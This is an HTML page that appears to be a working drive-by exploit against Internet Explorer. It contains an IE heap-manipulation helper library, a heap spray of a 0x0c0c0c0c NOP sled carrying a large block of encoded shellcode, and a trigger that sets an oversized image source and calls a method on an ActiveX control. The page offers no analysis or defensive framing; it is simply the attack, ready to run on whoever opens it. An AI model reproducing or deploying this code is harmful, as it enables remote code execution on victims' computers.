<html>
<head>
<script>


function hlp() {
}



hlp.ie = function(mc, hb) {

    this.mc = (mc ? mc : 65535);
    this.hb = (hb ? hb : 0x150000);

    // Allocate a padding string that uses mc bytes
    this.pstr = "AAAA";

    while (4 + this.pstr.length*2 + 2 < this.mc) {
        this.pstr += this.pstr;
    }
    
    // Create an array for storing references to allocated memory
    this.mem = new Array();

    // Call flushOleaut32() once to allocate the maximum size blocks
    this.flushOleaut32();
}



hlp.ie.prototype.debug = function(msg) {
    void(Math.atan2(0xbabe, msg));
}


hlp.ie.prototype.debugHeap = function(enable) {

    if (enable == true)
        void(Math.atan(0xbabe));
    else
        void(Math.asin(0xbabe));
}


hlp.ie.prototype.debugBreak = function(msg) {
    void(Math.acos(0xbabe));
}


hlp.ie.prototype.padding = function(len) {
    if (len > this.pstr.length)
        throw "Requested padding string length " + len + ", only " + this.pstr.length + " available";

    return this.pstr.substr(0, len);
}


hlp.ie.prototype.round = function(num, round) {
    if (round == 0)
        throw "Round argument cannot be 0";

    return parseInt((num + (round-1)) / round) * round;
}

hlp.ie.prototype.hex = function(num, width)
{
    var digits = "0123456789ABCDEF";

    var hex = digits.substr(num & 0xF, 1);

    while (num > 0xF) {
        num = num >>> 4;
        hex = digits.substr(num & 0xF, 1) + hex;
    }

    var width = (width ? width : 0);

    while (hex.length < width)
        hex = "0" + hex;

    return hex;
}


hlp.ie.prototype.addr = function(addr) {
    return unescape("%u" + this.hex(addr & 0xFFFF, 4) + "%u" + this.hex((addr >> 16) & 0xFFFF, 4));
}


hlp.ie.prototype.allocOleaut32 = function(arg, tag) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    // Create an array for this tag if doesn't already exist
    if (this.mem[tag] === undefined)
        this.mem[tag] = new Array();

    if (typeof arg == "string" || arg instanceof String) {
        // Allocate a new block with strdup of the string argument
        this.mem[tag].push(arg.substr(0, arg.length));
    }
    else {
        // Allocate the block
        this.mem[tag].push(this.padding((arg-6)/2));
    }
}


hlp.ie.prototype.freeOleaut32 = function(tag) {

    delete this.mem[tag];
    
    // Run the garbage collector
    CollectGarbage();
}


hlp.ie.prototype.flushOleaut32 = function() {

    this.debug("Flushing the OLEAUT32 cache");

    // Free the maximum size blocks and push out all smaller blocks

    this.freeOleaut32("oleaut32");
    
    // Allocate the maximum sized blocks again, emptying the cache

    for (var i = 0; i < 6; i++) {
        this.allocOleaut32(32, "oleaut32");
        this.allocOleaut32(64, "oleaut32");
        this.allocOleaut32(256, "oleaut32");
        this.allocOleaut32(32768, "oleaut32");
    }
}


hlp.ie.prototype.alloc = function(arg, tag) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if (size == 32 || size == 64 || size == 256 || size == 32768)
        throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";

    // Allocate the block with the OLEAUT32 allocator
    this.allocOleaut32(arg, tag);
}



hlp.ie.prototype.free = function(tag) {

    // Free the blocks with the OLEAUT32 free function
    this.freeOleaut32(tag);

    // Flush the OLEAUT32 cache
    this.flushOleaut32();
}


hlp.ie.prototype.gc = function() {

    this.debug("Running the garbage collector");
    CollectGarbage();

    this.flushOleaut32();
}



hlp.ie.prototype.freeList = function(arg, count) {

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++) {
        this.alloc(arg);
        this.alloc(arg, "freeList");
    }
    this.alloc(arg);

    this.free("freeList");
}



hlp.ie.prototype.lookaside = function(arg, count) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++)
        this.alloc(arg, "lookaside");

    this.free("lookaside");
}


hlp.ie.prototype.lookasideAddr = function(arg)
{
    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");

    // The lookahead array starts at hb + 0x688. It contains a 48 byte
    // structure for each block size + header size in 8 byte increments.

    return this.hb + 0x688 + ((size+8)/8)*48;
}


hlp.ie.prototype.vtable = function(shellcode, jmpecx, size) {

    var size = (size ? size : 1008);

    // Make sure the size is valid
    if ((size & 0xf) != 0)
        throw "Vtable size " + size + " must be a multiple of 16";

    if (shellcode.length*2 > size-138)
        throw("Maximum shellcode length is " + (size-138) + " bytes");

    // Build the fake vtable that will go on the lookaside list
    //
    // lookaside ptr  jmp +124  addr of jmp ecx  sub [eax], al*2  shellcode       null
    // 4 bytes        4 bytes   124 bytes        4 bytes          size-138 bytes  2 bytes

    var vtable = unescape("%u9090%u7ceb")   // nop, nop, jmp + 124

    for (var i = 0; i < 124/4; i++)
        vtable += this.addr(jmpecx);

    vtable += unescape("%u0028%u0028") +    // two sub [eax], al instructions
              shellcode + heap.padding((size-138)/2 - shellcode.length);

    return vtable;
}

var heap_obj = new hlp.ie(0x20000);
var code = unescape("%u0473%u4298%ubebf%u40b9%u2815%u0de3%u974f%u4996%u3f7c%u78b8%u4e70%ud08c%u74e1%u3848%u35fc%u438d%ueb88%u4b34%u3c77%u0a2d%u91f5%u1c4a%u05b0%u7a7f%u6772%u4137%u7bb2%uba2c%u33a9%ub5d4%u75b1%u307e%u69e2%ub4fd%u1d7d%uf887%u9b27%u9366%ubb24%u9947%u2f71%u900c%u46b7%ud580%uf96b%ub625%u9f3d%u1492%u18b3%ua8d6%u7c7d%u4e77%u4075%u7174%u2f4f%ub435%uf813%u1b7f%ue0d1%ub342%u4392%ua934%u667a%u3abe%u72e2%ub60c%u3978%u7bf9%uba25%u93b9%ud42a%ub0b1%u8114%ubfd6%u1d7e%ue329%u2247%u4bfd%ub824%u799f%u0546%u41b7%u971c%u2c91%ub50d%u3da8%u3c70%u0804%u67e1%u993f%u378d%ufc23%u8590%ub2d5%u7648%u842d%u9bf5%ubb98%ueb10%u7327%u4a15%u0271%uc6ff%uebc0%u9649%u7991%u4a7a%u7577%u8d3f%u3b72%u1af8%ub4d4%u3225%ue3d2%ub014%ub397%ua9b1%u4e2d%u0d73%ubb34%u4878%u432f%u9242%u2976%u4fd6%ub935%uf987%ub590%u1b70%ud3f7%u0ce1%u7c7d%u9847%uf522%u05a8%u991c%u4946%uba4b%u7b9b%u2427%u669f%u28bf%u31fd%u41e2%ue03a%u373c%u1d74%u2c67%u1593%ub8b2%ub73d%u027f%ub6fc%ube96%u0440%u307e%u75d5%u717d%uba66%u472d%u76b5%u041d%ue28c%ueb01%ud02a%ufcd2%ubbb0%u9f25%u4074%u4327%u73bf%u4f72%u99b8%u93a9%ubeb2%u989b%u157b%ua82c%u4678%uf809%ufd86%u841c%u7ee3%u8d35%uf912%u2070%u19d4%u2fd6%u960c%u6779%u9748%u77b4%u2449%u7a34%u3c4e%u1a7c%u3de1%ub137%u9105%ub90d%u144b%u833f%u7fe0%u904a%ud523%uf533%ub342%u75b7%u4177%u92b6%ue285%u7371%u7f7d%u3d70%ue011%u7846%ue118%uf803%u42b8%u7497%u8804%u89fd%uebc0%u9225%u7e8d%u7614%uc110%u49e3%u1cb5%u690d%u9fd5%ua937%u667c%u3bbe%u80d4%u48fc%uf908%ud639%u1db2%u7a91%u960c%u7241%u2c7b%u4a15%u4379%ubbb1%ub640%u2d9b%ub924%u6790%ue238%u984f%ua899%ubfb4%u0a78%u3ceb%u357a%ub393%u0575%ue381%uf513%u74b0%u7227%uba2f%u3f79%u7fb7%ue132%u7634%u734e%u6b4b%ue0f6%u7c47%u9b4b%u057e%u6625%u48b2%u9340%ub592%u3d71%u463c%u1db7%u0470%u43b0%u4f96%ubeb1%u7bba%u4924%u77fc%u7d14%u9027%u98a8%u2d37%u9941%ub647%ud5bf%ua9fd%u0bf5%ud6d4%u2b4a%uf8d1%u6797%u2f2c%ub9b3%u9f4e%u1c34%u8d35%ubb42%u0c0d%ub815%ub491%uf921%ubf3f%uea25%ub489%ucfdb%u74d9%uf424%u2b5d%ub1c9%u835e%u04c5%u7d31%u0310%u107d%u1fc7%ua462%uaa5d%u0c46%u9307%u8f95%ud747%u16ef%ue2a5%u2d1b%uf8c1%ud123%u8fee%ub797%ue989%u35eb%ua091%u5c75%ua078%uca5c%u2c68%uc1db%u779e%u3b75%u95df%u999c%u74cd%u03e7%uec6b%u24fa%u6b32%ub898%u0193%uc9f7%ud4d4%u20c0%u724c%u56b2%u70fb%u97a4%u4991%u8626%u70a5%uf7a2%ua1b8%u77a8%u9f02%u6a88%u32d6%u36c8%u684c%u30be%ud5ea%u9194%uf4f5%u0379%u7cd6%u7ee3%u06b0%ue58f%ue518%u8336%u1bc2%ua62a%u019c%u51f3%u7f72%uc3f8%u0eb2%u6237%u68ab%ucadd%u415f%u922d%u3391%u4971%u4f6c%uaeed%u0b1f%ub697%u4946%u42f7%ub1b7%uf41e%ua25e%ue342%u23cf%u0942%ued7a%u6b5e%ub477%u1595%ub2b9%u4777%uf8df%uc070%u5c23%ub55c%u8046%u53a2%ue9e1%uad02%u24d8%ue47b%u76bc%ue5e1%u4e05%u6f20%u394b%u167c%ud79d%u8ed4%u3414%udd70%u8c36%ud249%u6a7c%u2e05%u4140%uc7e2%uffea%u594e%u9955%uff08%u9a77%u3638%u956c%u1139%ua78f%u5e55%ub285%u4133%uaea5%u9e8e%udcbf%uabf3%uefe2%ua8e7%ufde6%ubb0e%u26f6%uf277%u2106%uea54%u341a%u31fc%u3903%u0412%u5132%u6f11%u3f49%u663f%ubd49%u7715%ud552%u936e%uf244%u8816%uf66f%ua7dd%u6098%u83d1%u4eb3%ufd1c%u84cc%ufa17%uaacf%u242e%uc0df%u0333%u4386%uc0b8%ua9c8%u066f%ub95f%u7618%u33fa%uf482%uda7d%u9525%u5118%u0698%uf88d%uabcb%u6f30%u0277%u17d7%uda12");
var nops = unescape("%u0c0c%u0c0c");

while (nops.length < 0x80000) nops += nops;

var offset = nops.substring(0, 0x100);
var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);

while (shellcode.length < 0x40000) shellcode += shellcode;
var block = shellcode.substring(0, (0x80000-6)/2);


heap_obj.gc();
for (var z=1; z < 0x230; z++) {
	heap_obj.alloc(block);
}


</script>
</head>
<body>
<object classid="clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4" id="aEOW"></object>
<script>
var obj = document.getElementById('aEOW').object;
var src = unescape("%u0c08%u0c0c");
while (src.length < 0x1002) src += src;
src = "\\\\xxx" + src;
src = src.substr(0, 0x1000 - 10);
var pic = document.createElement("img");
pic.src = src;
pic.nameProp;
obj.definition(772);
</script>
</body>
</html>
